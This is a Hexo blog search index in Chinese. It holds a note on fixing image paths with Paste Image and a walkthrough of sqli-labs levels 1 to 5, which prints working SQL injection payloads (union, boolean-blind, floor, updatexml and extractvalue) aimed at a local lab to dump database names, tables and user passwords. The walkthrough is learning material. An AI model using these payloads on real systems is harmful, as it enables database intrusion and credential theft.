<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo预览失败问题浅解</title>
      <link href="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/"/>
      <url>/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo预览失败问题浅解"><a href="#hexo预览失败问题浅解" class="headerlink" title="hexo预览失败问题浅解"></a>hexo预览失败问题浅解</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>在<code>VScode</code>上使用<code>Paste Image</code>插件,本地预览没有问题，本地预览不显示。原因位于hexo本身并不处理图片给定的图片路径，但是博客post下的文件会根据时间更改路径，导致出错。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1、修改博客根目录<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true <span class="comment">#在新建博文时，同目录下创建同名文件夹，为存放图片做准备</span></span><br></pre></td></tr></table></figure><p>2、修改<code>Paste Image</code>设置，保证文件存储到同名文件夹。</p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-44-29.png">  </p><p>打开 <code>extension setting</code>，点击打开setting.json  </p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-47-41.png"></p><p>添加如下两条：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;pasteImage.path&quot;</span>: <span class="string">&quot;$&#123;currentFileNameWithoutExt&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;pasteImage.insertPattern&quot;</span>: <span class="string">&quot;$&#123;imageSyntaxPrefix&#125;./$&#123;currentFileNameWithoutExt&#125;/$&#123;imageFileName&#125;$&#123;imageSyntaxSuffix&#125;&quot;</span>,</span><br></pre></td></tr></table></figure><p>第一条保存照片到同名文件夹，第二条保存图片url为相对路径，方便配合后面的插件</p><p>3、安装插件</p><p>该插件可以把图片放在博文同名文件夹下，并修改图片访问路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>最后，可以快乐的复制粘贴了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/ea78bdd0551f">解决Hexo博客不显示图片的一种方法</a><br><a href="https://tanjuntao.github.io/2019/04/28/%E8%A7%A3%E5%86%B3hexo%E4%B8%AD%E5%8F%91%E5%B8%83%E6%96%87%E7%AB%A0%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/">解决hexo中发布文章后图片无法显示的问题</a><br><a href="https://github.com/mushanshitiancai/vscode-paste-image/blob/master/src/extension.ts">Paste Image</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> un_problems </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2022/02/17/sqli-labs/"/>
      <url>/2022/02/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p><strong>level-1报错型-字符型 注入</strong></p><p>1、在url后边加入GET参数id，并故意添加单引号，测试是否存在简单注入点，得到报错，说明存在注入点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1256e96460c247a984fc8ca70620a95b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>2、判断字符还是整型注入。<br>测试如下url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>回显正常，说明为<strong>字符型</strong></p><p>原因</p><p><strong>字符型</strong>：where id&#x3D;’1 and 1&#x3D;2’，在引号内，遇到空格停止读取，等效于where id &#x3D;’1’。</p><p><strong>整型</strong>：where id&#x3D;1 and 1&#x3D;2，逻辑上会报错。</p><p>3、判断字段数。<br><a href="https://www.w3school.com.cn/sql/sql_orderby.asp">ORDER BY 语句用于对结果集进行排序。</a><br>显示的有三个信息，所以猜测有三个，判断字段数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan 1</span><br><span class="line">Your Login name:Dumb 2</span><br><span class="line">Your Password:Dumb 3</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 3%23 正常</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27;</span> order by <span class="number">4</span>%<span class="number">23</span> 会报错，Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>，所以有三个字段</span><br></pre></td></tr></table></figure><p>4、爆数据库、表、字段和其他数据<br><a href="https://www.runoob.com/sql/sql-union.html">SQL UNION 操作符合并两个或多个 SELECT 语句的结果。</a></p><p>大白话：可以利用该特性进行个性化查询。</p><p>（1）爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d77c6b8868fc49f58289a55d540cf638.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以利用2，3字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">法<span class="number">1</span>：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security 数据库名称</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>法2：通用语句，爆数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f71474a779ee4f2a9d3ece5d4283a937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>（2）爆表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e456241396c94049b2f7503ebdf685ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>(3)爆字段，以其中表users为例</p><p><a href="https://blog.csdn.net/chenhualeguan/article/details/52956662?utm_source=blogxgwz0">数据库中INFORMATION_SCHEMA的说明及使用</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/806f61ac76d04559bb070e932094825a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看其中的部分数据，如username,password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(username,password),3 from users%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d006dcf3400e41a59ad78edba2dbffda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p><strong>level-2报错型-整型 注入</strong><br>1、测试是否有简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>得到报错,存在简单注入  </p><p>2、判断字符型还是整型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 正常</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 错误</span><br></pre></td></tr></table></figure><p>说明为整型<br>3、爆字段数、数据库、表、字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> order by <span class="number">4</span><span class="comment">#  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-27-37.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#  //查看可泄露字段</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-30-51.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,database(),<span class="number">3</span><span class="comment"># //查看当前数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-32-32.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment"># //查看所有数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-36-35.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()<span class="comment"># //查看当前数据库所有表名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-37-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span><span class="comment"># //查看当前数据库某一表的全部字段名，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-39-53.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(username,password),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment"># //查看当前数据库某一表的部分字段内容，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-41-40.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p><strong>level3 报错-单引号-小括号-字符型-注入</strong><br>1、是否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; 报错，存在简单注入</span></span><br></pre></td></tr></table></figure><p>2、判断注入类型<br><img src="/2022/02/17/sqli-labs/2022-02-18-11-05-13.png"><br>对比一般的简单字符型注入，多出来一个单括号，所以推测后端代码 为 <code> WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code><br>所以注入类型为<strong>报错-单引号-小括号-字符型-sql注入</strong>，接下来构造语句时只需要保证单引号、括号闭合即可</p><p>4、爆字段数、数据库等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)order by 4 %23  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-13-47.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,3 %23 //包显性字段 </span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-15-19.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,database(),3 %23 //爆数据库</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-16-09.png"><br>接下来同level1\2，不展示了</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p><strong>报错-双引号-小括号-字符型-sql注入</strong>  </p><p>1、测判断否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; //正常，排除单引号报错</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; //报错</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-27-15.png"><br>看到双引号，判断为<strong>报错-双引号-小括号-字符型-sql注入</strong>，推测后端查询语句为<br><code>where id = (&quot;$id&quot;) LIMIT 0,1; </code><br>2、爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;) order by 4%23 //保证闭合即可</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-13-25.png"><br>3、爆显性字段   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-14-22.png"><br>4、爆数据库、表名、字段等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,database(),3 %23 //爆数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-17-52.png"><br>后面和level1\2\3一样，不展示了</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p><strong>报错回显&#x2F;布尔-字符型-注入</strong><br>1、布尔注入<br>回显只有正确和无，但是判断确实存在注入的情况。<br>设计语句返回true&#x2F;false 一点点爆破数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1=1%23  成功通过，存在布尔注入</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-23-08-21.png">  </p><p>布尔注入常用函数及语句:<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">str</span>)：返回<span class="built_in">str</span>字符串的长度。</span><br><span class="line">substr(<span class="built_in">str</span>, pos, <span class="built_in">len</span>)：将<span class="built_in">str</span>从pos位置开始截取<span class="built_in">len</span>长度的字符进 行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(<span class="built_in">str</span>,pos,<span class="built_in">len</span>):跟上面的一样，截取字符串</span><br><span class="line"><span class="built_in">ascii</span>(<span class="built_in">str</span>)：返回字符串<span class="built_in">str</span>的最左面字符的ASCII代码值。</span><br><span class="line"><span class="built_in">ord</span>(<span class="built_in">str</span>):同上，返回<span class="built_in">ascii</span>码</span><br><span class="line"><span class="keyword">if</span>(a,b,c) :a为条件，a为true，返回b，否则返回c，如<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔注入常用语句：<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断数据库长度 </span><br><span class="line"><span class="string">&#x27; or Length(database()) = 8 #返回true说明数据库长度为8</span></span><br><span class="line"><span class="string">2.获取数据库名字</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="string">&#x27;ascill值&#x27;</span><span class="comment">#</span></span><br><span class="line">依次获取</span><br><span class="line"><span class="number">3.</span>获取表的总数</span><br><span class="line"><span class="string">&#x27; or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#</span></span><br><span class="line"><span class="string">4.获取表的长度(第一个表)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (select length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES where TABLE_SCHEMA=database() limit <span class="number">0</span>,<span class="number">1</span> )= (猜测得长度)<span class="comment">#</span></span><br><span class="line"><span class="number">5.</span>获取表的内容</span><br><span class="line"><span class="string">&#x27; or  mid((select TABLE_NAME from information_schema.TABLES where </span></span><br><span class="line"><span class="string">TABLE_SCHEMA=database() limit 0,1),1,1)   = &#x27;</span>a<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">6.获取表的字段的总数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span>  (select count(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS where TABLE_NAME=表名 ) = <span class="number">8</span><span class="comment">#8返回true说明有8个表</span></span><br><span class="line">依次类推,最后推出内容</span><br></pre></td></tr></table></figure><p>写了一些脚本，顺便学习了python多线程。<br>2、报错注入<a href="#refer-anchor-2"><sup>2</sup></a><br>(1). floor报错注入,由于floor\count\group by 这三个函数导致，<strong>原理</strong><a href="#refer-anchor-3"><sup>3</sup></a>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat((payload),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a)</span><br><span class="line">```  </span><br><span class="line">示例：</span><br><span class="line">爆数据库</span><br><span class="line">```python</span><br><span class="line">//payload为select database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">// <span class="number">0x7e</span> 是~,方便脚本抓取数据</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆表,可以根据设置是否需要 limit，这里只能显示一行，所以要用一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select table_name <span class="keyword">from</span> information_schema.tables where table_schema =database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema =database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select column_name <span class="keyword">from</span> information_schema.columnss where table_name =<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columnss where table_name =&#x27;</span>users<span class="string">&#x27; limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>报数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>其中payload为你要插入的SQL语句<br>需要注意的是该语句将,输出字符长度限制为64个字符</p><p>(2). updatexml报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,payload,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符,只有在payload返回的不是xml格式才会生效</p><p>(3). ExtractValue报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符</p><p>这里后两种方法没反应，待补</p><p>参考：  </p><div id="refer-anchor-1"></div><ul><li><p>[1] <a href="https://segmentfault.com/a/1190000021795049">SQL注入之布尔注入原理</a></p><div id="refer-anchor-2"></div></li><li><p>[2] <a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label2">报错注入lv5</a></p><div id="refer-anchor-3"></div></li><li><p>[3] <a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL注入-报错注入</a></p></li><li><p>[3-1] <a 